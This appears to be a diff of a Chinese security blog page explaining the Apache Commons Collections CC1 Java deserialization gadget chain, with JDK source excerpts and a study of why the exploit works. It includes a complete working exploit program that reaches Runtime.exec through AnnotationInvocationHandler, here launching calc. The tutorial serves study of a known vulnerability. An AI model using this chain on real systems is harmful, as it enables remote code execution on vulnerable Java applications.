+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111314683.png"></p>
 <p>在自己的jdk目录下将src压缩包解压</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111508088.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111508088.png"></p>
 <p>sun包copy到jdk的src目录下：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122113329914.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122113329914.png"></p>
 <p>添加库：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122112147020.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122112147020.png"></p>
 <p>查找setValue()用法时便能看到被AnnotationInvocationHandler的readObject()方法调用了，同时注意到该类不是public，只能在当前包下访问：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122114338097.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122114338097.png"></p>
 <p>既然不是public，那就可以使用强大的反射来调用</p>
 <p>最终exp：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ser.impl.MapEntrySerializer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;<span class="hljs-comment">//获取到了getRuntime方法</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;<span class="hljs-comment">//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span><br>                            <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>            &#125;;<br>            <span class="hljs-comment">// 创建ChainedTransformer调⽤链对象</span><br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformedChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-comment">// 执⾏对象转换操作</span><br><span class="hljs-comment">//            transformedChain.transform(null);</span><br>            Map&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;CC&quot;</span>);<br>            Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,transformedChain);<br><span class="hljs-comment">//            transformedMap.put(&quot;h&quot;,&quot;hh&quot;);</span><br><span class="hljs-comment">//            for (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">//                entry.setValue(&quot;any&quot;);</span><br><span class="hljs-comment">//            &#125;</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>            <span class="hljs-comment">//创建构造器</span><br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);<br>            constructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class,transformedMap);<br>            serialize(obj);<br>            unserialize(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>));<br>            outputStream.writeObject(o);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span>  objectInputStream.readObject();<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>为什么是在构造函数第一个参数传入Target.class呢？这里跳到AnnotationInvocationHandler的构造函数处，可以看到第一个参数是一个Class的泛型，继承了注解的Annotation类，下面的if判断要求第一个参数isAnnotation()必须返回true，即必须是一个注解的类，Target是注解，当然Override也是，继续往下看</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124173103719.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124173103719.png"></p>
 <p>会发现Target有一个value()方法，而Override没有</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202726171.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202758635.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202726171.png"></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202758635.png"></p>
 <p>在测试的时候发现只有put的键为”value”时才能触发反序列化，那为什么put()的键需要是”value”呢？</p>
 <p>我们去看最后的readObject()的重写：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>显然要走到最后的setValue()需要经过一个if判断，要求memberType非空，memberType是要以name变量为参数调用get()方法获取，意味着name变量不能为空，那name变量是什么？继续往上看，name是从memberValue中获取键，memberValue是一个键值对，遍历于memberValues，memberValues是在构造函数中被赋值的，就是我们传入的Map对象，也就是transformedMap</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124172054469.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124172054469.png"></p>
 <p>因此put上去的map的键，最终是“value”，memberTypes去get()获取”value”这个成员，那memberTypes是什么呢？</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124221325557.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124221325557.png"></p>
 <p>是调用了annotationType的memberTypes()方法，那annotationType是怎么定义的</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124222409538.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124222409538.png"></p>
 <p>把我们传入的注解作为参数了，瞅一眼实现类AnnotationType的构造函数：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">AnnotationType</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; var1)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!var1.isAnnotation()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Not an annotation type&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Method[] var2 = (Method[])AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;<br>            <span class="hljs-keyword">public</span> Method[] run() &#123;<br>                <span class="hljs-keyword">return</span> var1.getDeclaredMethods();<br>            &#125;<br>        &#125;);<br>        <span class="hljs-built_in">this</span>.memberTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(var2.length + <span class="hljs-number">1</span>, <span class="hljs-number">1.0F</span>);<br>        <span class="hljs-built_in">this</span>.memberDefaults = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">this</span>.members = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(var2.length + <span class="hljs-number">1</span>, <span class="hljs-number">1.0F</span>);<br>        Method[] var3 = var2;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var3[var5];<br>            <span class="hljs-keyword">if</span> (var6.getParameterTypes().length != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(var6 + <span class="hljs-string">&quot; has params&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var6.getName();<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var6.getReturnType();<br>            <span class="hljs-built_in">this</span>.memberTypes.put(var7, invocationHandlerReturnType(var8));<br>            <span class="hljs-built_in">this</span>.members.put(var7, var6);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var6.getDefaultValue();<br>            <span class="hljs-keyword">if</span> (var9 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.memberDefaults.put(var7, var9);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (var1 != Retention.class &amp;&amp; var1 != Inherited.class) &#123;<br>            <span class="hljs-type">JavaLangAccess</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> SharedSecrets.getJavaLangAccess();<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> AnnotationParser.parseSelectAnnotations(var10.getRawClassAnnotations(var1), var10.getConstantPool(var1), var1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Retention.class, Inherited.class&#125;);<br>            <span class="hljs-type">Retention</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> (Retention)var11.get(Retention.class);<br>            <span class="hljs-built_in">this</span>.retention = var12 == <span class="hljs-literal">null</span> ? RetentionPolicy.CLASS : var12.value();<br>            <span class="hljs-built_in">this</span>.inherited = var11.containsKey(Inherited.class);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.retention = RetentionPolicy.RUNTIME;<br>            <span class="hljs-built_in">this</span>.inherited = <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>var3是注解类中成员方法的集合，（比如Target下的value()）</p>
-<h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><h2 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h2><h3 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h3><h3 id="lab2-ysoserial"><a href="#lab2-ysoserial" class="headerlink" title="lab2-ysoserial"></a>lab2-ysoserial</h3><h3 id="lab3-shiro-jrmp"><a href="#lab3-shiro-jrmp" class="headerlink" title="lab3-shiro-jrmp"></a>lab3-shiro-jrmp</h3><h3 id="lab4-shiro-blind"><a href="#lab4-shiro-blind" class="headerlink" title="lab4-shiro-blind"></a>lab4-shiro-blind</h3><h3 id="lab5-weblogic-readResolve"><a href="#lab5-weblogic-readResolve" class="headerlink" title="lab5-weblogic-readResolve"></a>lab5-weblogic-readResolve</h3><h3 id="lab6-weblogic-resolveProxyClass"><a href="#lab6-weblogic-resolveProxyClass" class="headerlink" title="lab6-weblogic-resolveProxyClass"></a>lab6-weblogic-resolveProxyClass</h3><h3 id="lab7-weblogic-UnicastRef"><a href="#lab7-weblogic-UnicastRef" class="headerlink" title="lab7-weblogic-UnicastRef"></a>lab7-weblogic-UnicastRef</h3><h3 id="lab8-jrmp-unicastRemoteObject"><a href="#lab8-jrmp-unicastRemoteObject" class="headerlink" title="lab8-jrmp-unicastRemoteObject"></a>lab8-jrmp-unicastRemoteObject</h3><h3 id="lab9-proxy"><a href="#lab9-proxy" class="headerlink" title="lab9-proxy"></a>lab9-proxy</h3>
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" class="category-chain-item">常见漏洞</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">Web漏洞</a>
-  
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Web/">#Web</a>
-      
-        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
-      
-        <a href="/tags/PHP/">#PHP</a>
-      
-        <a href="/tags/Java/">#Java</a>
-      
-    </div>
-  
-</div>
-
-
-              
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/02/09/XSS/" title="XSS">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">XSS</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/02/08/HELLO/" title="HELLO">
-                        <span class="hidden-mobile">HELLO</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://potatowo233.github.io/" target="_blank" rel="nofollow noopener"><span>Potat0w0</span></a> <i class="iconfont icon-love"></i>
-
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  
-<script src="/js/click.js"></script>
-<script src="/js/snow.js"></script>
-<script src="/js/potato.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
